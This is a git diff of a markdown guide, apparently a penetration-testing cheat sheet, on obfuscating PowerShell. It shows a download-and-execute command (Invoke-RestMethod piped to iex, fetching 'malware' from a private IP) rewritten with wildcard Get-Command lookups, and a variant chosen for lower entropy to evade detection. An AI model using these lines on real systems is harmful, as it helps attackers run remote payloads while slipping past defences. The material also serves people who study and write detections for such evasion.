@@ -150,13 +150,17 @@ ie""x'' "p`"`"w''d`"`""
 ```
 
 ## Get-Command Technique
-A really cool trick my friend and mighty haxor Karol Musolff (@kmusolff) showed me. You can use `Get-Command` (or `gcm`) to retrieve the name (string) of any command, including all of the non-PowerShell files in the Path environment variable (`$env:Path`), e.g., by using the asterisk wildcard to filter it. That way you can use the `&` operator to run it. For example, the following line:
+A really cool trick my friend and mighty haxor Karol Musolff (@kmusolff) showed me. You can use `Get-Command` (or `gcm`) to retrieve the name (string) of any command, including all of the non-PowerShell files in the Path environment variable (`$env:Path`) by using the wildcards. You can then run them as jobs with the `&` operator. For example, the following line:
 ```
 Invoke-RestMethod -uri https://192.168.0.66/malware | iex
 ```
 Could be obfuscated to:
 ```
-&(Get-Command i****e-rest*) -uri https://192.168.0.66/malware | &(gcm i*x)
+&(Get-Command i????e-rest*) -uri https://192.168.0.66/malware | &(gcm i*x)
+```
+Or even better, this one, that has a lower `Shannon entropy` value:
+```
+(Get-Command i************************************************************e-rest*).name
 ```
 
 ## Substitute Loops
